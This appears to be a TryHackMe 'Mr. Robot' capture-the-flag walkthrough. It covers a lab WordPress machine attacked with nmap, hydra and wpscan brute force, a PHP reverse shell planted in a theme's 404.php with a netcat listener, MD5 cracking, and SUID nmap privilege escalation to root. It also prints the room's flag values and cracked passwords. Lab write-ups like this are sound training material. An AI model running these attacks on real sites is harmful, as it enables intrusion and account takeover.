---
title: "TryHackMe - Mr. Robot Walkthrough"
date: 2020-09-27
tags: [tryhackme, walkthrough]
header:
  image: "/images/mrrobot-thumbnail.jpg"
excerpt: "Walkthroughs"
---

# TryHackMe - Mr. Robot Walkthrough

Hello, everyone. Today I will share the Boot to Root process in Mr. Robot vulnerable machine. I will try to share only the main points during the process.

## Information Gathering
Firstly, we start with **Nmap scanning**
```
root@kali:~/Desktop/MrRobot# nmap -p- -T4 -A mrrobot.local
PORT STATE SERVICE VERSION  
22/tcp closed ssh  
80/tcp open http Apache httpd  
|_http-server-header: Apache  
|_http-title: Site doesn't have a title (text/html).  
443/tcp open ssl/http Apache httpd  
|_http-server-header: Apache  
...
```

We only find that there is a website of the machine. We investigate a bit the website. View page source code, typing commands in the website interface, but there is not anything special.

Then we make a **Nikto search**.
```
root@kali:~/Desktop/MrRobot# nikto -h mrrobot.local
```
It doesn't give a wanted result.
I run now on **Dirbuster** to find invisible, secret files, folders.
```
...
/wp-content/
/images/feed/
/wp-login/
...

Files found with a 200 response:

/wp-login.php
/wp-content/index.php
/license.txt
/robots.txt
```

That is wonderful. Now we know that this is a WordPress website and I found something interesting. "/robots.txt"

When I look for this page there is 3 title:

 1. User-agent: *
 2. fsocity.dic
 3. key-1-of-3.txt
I believe that the second and third titles are the files. I download both of them.

```
root@kali:~/Desktop/MrRobot# wget mrrobot.local/fsocity.dic  
...
root@kali:~/Desktop/MrRobot# wget mrrobot.local/key-1-of-3.txt  
...
root@kali:~/Desktop/MrRobot# cat key-1-of-3.txt  
073403c8a58a1f80d943455fb30724b9  
root@kali:~/Desktop/MrRobot# wc fsocity.dic
858160 858160 7245381 fsocity.dic
```
 We find the first key and find a dictionary file which has 858160 entries. We try to make a smaller file with deleting the same entries
```
root@kali:~/Desktop/MrRobot# cat fsocity.dic | sort | uniq > wordlist.dic
```
Now we have 11451 entries. Almost 75 times much smaller.

## Exploitation
Now we will do a **Brute force attack** to the WordPress login page to find the username, but before that, we will need to capture a POST request with **BurpSuite** to write a complete command.

<img src="https://photos.app.goo.gl/TGVz1fArps1ie5XA9"></img>

```
root@kali:~/Desktop/MrRobot# hydra -V -L ./wordlist.dic -p 123 mrrobot.local http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
```

 - **-V** : verbose mode
 - **-L** : login file
 - **-p** : password
 - **http-post-form** : we will do HTTP POST request
 - **'/wp-login.php:log=\^USER\^&pwd=\^PASS\^&wp-sumbit=Log+In=Invalid username'** : this is for WordPress admin login. For more you can look this link. ([Hydra Cheetsheet](https://github.com/frizb/Hydra-Cheatsheet))

The brute force attack has started.
```

...
[ATTEMPT] target mrrobot.local - login "eps1" - pass "123" - 23 of 858235 [child 3] (0/0)  
[80][http-post-form] host: mrrobot.local login: Elliot password: 123  
[ATTEMPT] target mrrobot.local - login "null" - pass "123" - 24 of 858235 [child 5] (0/0)  
...

```
Do you see that? When hydra used Elliot:123 the username and the password, the HTTP POST request was realized. It means that "Elliot" is our username.

The next step is to find the password of "Elliot". In this step, we will use **wpscan** command. It takes only a minute or two.
```

root@kali:~# wpscan --url http://mrrobot.local --passwords /root/Desktop/MrRobot/wordlist.dic --usernames Elliot  
...
[!] Valid Combinations Found:  
| Username: Elliot, Password: ER28-0652  
...

```
That's awesome! Now we can access the WordPress Admin Panel easily. Now we will need a reverse shell to access the host server.
On our machine, we are listening for coming connections using **netcat**:
```
root@kali:~/Desktop/MrRobot# nc -nvlp 1234  
listening on [any] 1234 ...  
```
After that, we edit the PHP reverse shell file's port number and IP address. Then we go to the Appearance menu and edit current pages. We delete all the codes in the 404.php file and add our reverse shell script. ([Reverse Shell Script](https://github.com/pentestmonkey/php-reverse-shell))

In another tab, we send a GET request to the 404 Error page.

```
root@kali:~/Desktop/MrRobot# wget mrrobot.local/404.php
```

And that's it. We successfully get the reverse shell.


## Privilege Escalation

```
...
$    
$ pwd  
/  
$ whoami  
daemon  
$ cd home  
$ ls  
robot  
$ cd robot  
$ ls  
key-2-of-3.txt  
password.raw-md5  
$ cat password.raw-md5  
robot:c3fcd3d76192e4007dfb496cca67e13b  
```

We are `daemon`, service user. We need to find the other two keys. We will change the directory to `home` to look for other users. We see there is only `robot` and also there are two files in the home directory of the robot. One of them is the second key and another is the MD5 hash. It is the hash of the password of `robot`.

We try to crack the hash by using rockyou.txt.
```
root@kali:~# hashcat -m 0 -a 0 -o password.txt /root/Desktop/MrRobot/hash ./rockyou.txt --show
root@kali:~/Documents# cat password.txt
c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz

```
It takes only a second. Amazing!


After that, we go back to our reverse shell and make it interactive.
```
$ python -c 'import pty; pty.spawn("/bin/sh")'
```

Then we log in to our `robot` account.
```
$ su robot
password: abcdefghijklmnopqrstuvwxyz
robot@linux:/$
```

We get it!
Now there is one important thing that we need to get root privileges to find the last and third key. So we will do **Privilege Escalation with SUID**. First of all, we are looking for such a type of bit sets.
```
robot@linux:/$ find / -perm 4000 >2 /dev/null  
find / -perm 4000 >2 /dev/null  
bash: 2: Permission denied  
robot@linux:/$ find / -perm 4000 >2/dev/null  
find / -perm 4000 >2/dev/null  
bash: 2/dev/null: No such file or directory  
robot@linux:/$ find / -perm -u=s -type f 2>/dev/null  
find / -perm -u=s -type f 2>/dev/null  
/bin/ping  
/bin/umount  
/bin/mount  
/bin/ping6  
/bin/su  
/usr/bin/passwd  
/usr/bin/newgrp  
/usr/bin/chsh  
/usr/bin/chfn  
/usr/bin/gpasswd  
/usr/bin/sudo  
/usr/local/bin/nmap  
/usr/lib/openssh/ssh-keysign  
/usr/lib/eject/dmcrypt-get-device  
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper  
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper  
/usr/lib/pt_chown
```

Now, most of them are normal commands except one. It is `nmap`. I try to open the interactive nmap console:
```
robot@linux:/$ nmap --interactive
nmap>
```

Then, we try open shell by `/bin/sh` and it doesn't work. So we try such a legacy way.
```
nmap> !sh   
# id  
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)  
# cd /root
# cat key-3-of-3.txt  
04787ddef27c3dee1ee161b21670b4e4
```
We did it! Thanks for reading.
